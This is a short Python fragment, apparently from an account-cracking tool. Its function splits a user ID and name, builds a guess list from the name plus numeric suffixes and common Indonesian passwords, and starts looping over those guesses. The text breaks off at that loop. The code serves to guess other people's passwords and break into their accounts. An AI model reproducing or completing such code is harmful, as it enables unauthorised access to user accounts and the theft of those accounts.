...
def bapi(user):
	...
	uid, name = user.split("<=>")
	if len(name)>=6:
		pwx = [ name, name+"123", name+"1234", name+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
	elif len(name)<=2:
		pwx = [ name+"123", name+"1234", name+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
	elif len(name)<=3:
		pwx = [ name+"123", name+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
	else:
		pwx = [ name+"123", name+"12345", "anjing", "sayang", "12345678", "indonesia", "iloveyou" ]
	try:
		for pw in pwx:
